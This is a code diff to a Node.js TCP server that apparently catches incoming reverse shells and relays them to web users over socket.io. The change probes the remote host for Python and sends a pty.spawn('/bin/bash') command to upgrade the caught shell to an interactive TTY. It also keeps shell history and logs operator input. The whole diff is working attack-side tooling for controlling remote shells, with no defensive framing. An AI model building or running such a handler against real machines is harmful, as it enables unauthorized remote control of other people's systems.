@@ -17,23 +17,42 @@ module.exports = class TCPServer {
         this.addTcpShell(socket);
 
         // Upgrade shell
-        socket.write(
-          Buffer.from(`python3 -c 'import pty; pty.spawn("/bin/bash")'\n`)
-        );
+        setTimeout(() => {
+          socket.once("data", (python) => {
+            let output = python.toString().trim();
+            if (!output.includes("python")) {
+              socket.write(
+                Buffer.from(
+                  'echo "Python is not installed on this server. Can\'t upgrade to TTY Interactive Shell"\n'
+                )
+              );
+            } else {
+              socket.isTty = true
+              socket.write(
+                Buffer.from(
+                  `${output} -c 'import pty; pty.spawn("/bin/bash")'\n`
+                )
+              );
+              socket.write(Buffer.from(`clear\n`));
+            }
+          });
+          socket.write(Buffer.from("which python python2 python2\n"));
+        }, 200);
 
         namespace.on("connection", (user) => {
           for (const h of socket.history) {
             user.emit("data", h);
           }
           user.on("data", (data) => {
+            console.log(data);
             socket.write(data);
           });
         });
         socket.on("data", (data) => {
           socket.history.push(data);
           // $ clear -> clear history
-          if(data.toString("hex") == '1b5b481b5b324a1b5b334a'){
-            socket.history = []
+          if (data.toString("hex") == "1b5b481b5b324a1b5b334a") {
+            socket.history = [];
           }
           namespace.emit("data", data);
         });
